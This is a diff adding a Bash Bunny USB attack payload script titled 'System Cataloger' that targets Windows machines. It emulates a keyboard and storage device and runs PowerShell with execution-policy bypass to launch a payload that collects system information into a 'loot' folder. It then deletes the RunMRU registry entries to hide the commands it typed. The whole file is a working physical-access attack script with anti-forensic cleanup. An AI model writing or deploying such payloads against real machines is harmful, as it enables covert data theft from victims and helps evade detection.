@@ -1,0 +1,33 @@
+#!/bin/bash
+#
+#Title: System Caltaloger
+#Description: Collect Basic System INFO
+#Scripter: Ryan_Van_Mass
+#Target: Windows
+
+
+############## SETUP ##############
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+GET TARGET_HOSTNAME
+
+#NOTE: payload.ps1 will make a subfolder of the LOOTDIR to store files in if you change LOOTDIR insure you change it in the payload.ps1 file aswell
+LOOTDIR=/root/udisk/loot/SystemCataloger/
+mkdir -p $LOOTDIR
+sleep 5
+
+############## ATTACK ##############
+LED ATTACK
+RUN WIN "powershell -Exec Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\payload.ps1')"
+sleep 30
+
+############## CLEAN UP ##############
+LED CLEANUP
+#Removes Run Line Entry
+RUN WIN "powershell Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK DELAY 500
+
+
+############## DONE ##############
+LED FINISH
